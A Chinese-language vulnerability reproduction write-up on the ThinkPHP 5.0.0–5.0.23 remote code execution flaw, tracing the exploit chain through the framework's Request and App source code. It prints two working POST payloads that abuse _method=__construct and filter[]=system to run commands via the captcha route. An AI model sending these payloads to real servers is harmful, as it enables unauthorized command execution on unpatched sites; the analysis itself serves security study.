categories:
- cve复现
tags:
- cve复现
title:  ThinkPHP 5.0.0~5.0.23 RCE 漏洞复现
---
# ThinkPHP 5.0.0~5.0.23 RCE 漏洞复现



## 利用条件



 ThinkPHP 5.0.0~5.0.23 

## exp

```
http://127.0.0.1/index.php?s=captcha

post_ex1：_method=__construct&filter[]=system&method=get&get[]=whoami
post_exp2：_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=whoami
```





## 过程复现(exp1)

 以 thinkphp 5.0.22 完整版为复现环境(为啥要完整版等会说)，下载地址：http://www.thinkphp.cn/down/1260.html 

 官方补丁地址：https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003 



![image562](https://i.loli.net/2020/01/30/LohuXMViDeg9AxT.png)



其中`$this->{$this->method}($_POST);`可以执行任意接受一个数组的request方法,`$this->method`可以通过控制`$_POST['_method']`来控制

查找相关方法后选定`__construct`来修改request属性再结合其他方法形成利用链

```php
protected function __construct($options = [])
    {
        foreach ($options as $name => $item) {
            if (property_exists($this, $name)) {
                $this->$name = $item;
            }
        }
        if (is_null($this->filter)) {
            $this->filter = Config::get('default_filter');
        }

        // 保存 php://input
        $this->input = file_get_contents('php://input');
    }
```



查找request中可能命令执行的方法时发现,input()方法可以通过修改filter来达到任意命令执行的效果

```php
public function input($data = [], $name = '', $default = null, $filter = '')
    {
        ...

        // 解析过滤器
        $filter = $this->getFilter($filter, $default);

        if (is_array($data)) {
            array_walk_recursive($data, [$this, 'filterValue'], $filter);//命令执行
            reset($data);
        } else {
            $this->filterValue($data, $name, $filter);
        }

        ...
    }
```

![image1678](https://i.loli.net/2020/01/30/Fp5XRUNjlxABPWt.png)



接着查找调用method()的地方,下断点

![image1768](https://i.loli.net/2020/01/30/F6ZvjtxGdP7uiKa.png)

从入口点App.php开始查看可能作为攻击链一部分的地方

节选App.php关键内容

```php
public static function run(Request $request = null)
    {
        $request = is_null($request) ? Request::instance() : $request;

        try {
            ...
            // 获取应用调度信息
            $dispatch = self::$dispatch;

            // 未设置调度信息则进行 URL 路由检测
            if (empty($dispatch)) {
                $dispatch = self::routeCheck($request, $config);
            }

            // 记录当前调度信息
            $request->dispatch($dispatch);

            // 记录路由和请求信息
            ...
            $data = self::exec($dispatch, $config);
        } catch (HttpResponseException $exception) {
            $data = $exception->getResponse();
        }
		...
    }
```

跟进routeCheck

```php
public static function routeCheck($request, array $config)
    {
        $path   = $request->path();
        $depr   = $config['pathinfo_depr'];
        $result = false;

        // 路由检测
        $check = !is_null(self::$routeCheck) ? self::$routeCheck : $config['url_route_on'];
        if ($check) {
            ...
            $result = Route::check($request, $path, $depr, $config['url_domain_deploy']);
            ...
        }

        ...

        return $result;
    }
```



跟进check,在获取method时调用了method方法

```php
public static function check($request, $url, $depr = '/', $checkDomain = false)
    {
        //检查解析缓存
        ...
        $method = strtolower($request->method());
        // 获取当前请求类型的路由规则
       ...
    }
```

返回App.php,我们可以看到一个敏感的函数`$data = self::exec($dispatch, $config);`

跟进exec瞧一瞧

```php
protected static function exec($dispatch, $config)
    {
        switch ($dispatch['type']) {
            case 'redirect': // 重定向跳转
                $data = Response::create($dispatch['url'], 'redirect')
                    ->code($dispatch['status']);
                break;
            case 'module': // 模块/控制器/操作
                $data = self::module(
                    $dispatch['module'],
                    $config,
                    isset($dispatch['convert']) ? $dispatch['convert'] : null
                );
                break;
            case 'controller': // 执行控制器操作
                $vars = array_merge(Request::instance()->param(), $dispatch['var']);
                $data = Loader::action(
                    $dispatch['controller'],
                    $vars,
                    $config['url_controller_layer'],
                    $config['controller_suffix']
                );
                break;
            case 'method': // 回调方法
                $vars = array_merge(Request::instance()->param(), $dispatch['var']);
                $data = self::invokeMethod($dispatch['method'], $vars);
                break;
            case 'function': // 闭包
                $data = self::invokeFunction($dispatch['function']);
                break;
            case 'response': // Response 实例
                $data = $dispatch['response'];
                break;
            default:
                throw new \InvalidArgumentException('dispatch type not support');
        }

        return $data;
    }
```

如果`$dispatch['type']='controller' or 'method' `时会调用`Request::instance()->param()`



```php
public function param($name = '', $default = null, $filter = '')
    {
        if (empty($this->mergeParam)) {
            $method = $this->method(true);
            // 自动获取请求变量
			...
            $this->param      = array_merge($this->param, $this->get(false), $vars, $this->route(false));
            $this->mergeParam = true;
        }
        ...
        return $this->input($this->param, $name, $default, $filter);
    }
```

而param则会调用input从而形成完整的攻击链,其中`$filter`时我们要执行的命令,`$this->param`则是参数,

`$this->param = array_merge($this->param, $this->get(false), $vars, $this->route(false));`

但是我们不能直接通过修改`__construct`来修改param,因为在运行过程中`$this->param`会被覆盖,但是`$this->get`却不会,于是我们需要覆盖`$this->filter`和`$this->get`





接下来就是如何让`$dispatch['type']='controller' or 'method' `的问题了

![image5781](https://i.loli.net/2020/01/30/qeliaZJokYSUMg2.png)

这也是为啥要tp完整版的原因,完整版里才有captcha模块

> 注意我们请求的路由是`?s=captcha`，它对应的注册规则为`\think\Route::get`。在`method`方法结束后，返回的`$this->method`值应为`get`这样才能不出错，所以payload中有个`method=get` 

于是最后的payload是

```
http://127.0.0.1/index.php?s=captcha

_method=__construct&filter[]=system&method=get&get[]=whoami
```

## 过程复现(exp2)

攻击链的前面基本相同,只有调用`Request::input`方法的地方不同而进入不同分支

我们看到`Request::param`方法

```php
public function param($name = '', $default = null, $filter = '')
    {
        if (empty($this->mergeParam)) {
            $method = $this->method(true);
            // 自动获取请求变量
			...
            $this->param      = array_merge($this->param, $this->get(false), $vars, $this->route(false));
            $this->mergeParam = true;
        }
        ...
        return $this->input($this->param, $name, $default, $filter);
    }
```

注意这一个`$this->method(true);`

`Request::method`



```php
	public function method($method = false)
    {
        if (true === $method) {
            // 获取原始请求类型
            return $this->server('REQUEST_METHOD') ?: 'GET';
        } 
        ...
    }
```

它会调用`Request::server`,而这个方法也会调用`Request::input`

```php
public function server($name = '', $default = null, $filter = '')
    {
        if (empty($this->server)) {
            $this->server = $_SERVER;
        }
        if (is_array($name)) {
            return $this->server = array_merge($this->server, $name);
        }
        return $this->input($this->server, false === $name ? false : strtoupper($name), $default, $filter);
    }
```



继续分析代码发现,rce的参数变为了`$this->server['REQUEST_METHOD']`

```php
public function input($data = [], $name = '', $default = null, $filter = '')
    {
        if ('' != $name) {
            // 解析name
            if (strpos($name, '/')) {
                list($name, $type) = explode('/', $name);
            } else {
                $type = 's';
            }
            // 按.拆分成多维数组进行判断
            foreach (explode('.', $name) as $val) {
                if (isset($data[$val])) {
                    $data = $data[$val];
                } else {
                    // 无输入数据，返回默认值
                    return $default;
                }
            }
            if (is_object($data)) {
                return $data;
            }
        }

        // 解析过滤器
        $filter = $this->getFilter($filter, $default);

		...
        return $data;
    }
```

于是有

```php
http://127.0.0.1/public/index.php?s=captcha

POST:

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=whoami
```



## 参考

[Smi1e ---- ThinkPHP 5.0.0~5.0.23 RCE 漏洞分析]( [https://www.smi1e.top/thinkphp-5-0-05-0-23-rce-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/](https://www.smi1e.top/thinkphp-5-0-05-0-23-rce-漏洞分析/) )

 https://xz.aliyun.com/t/3845#toc-2 

 https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce 

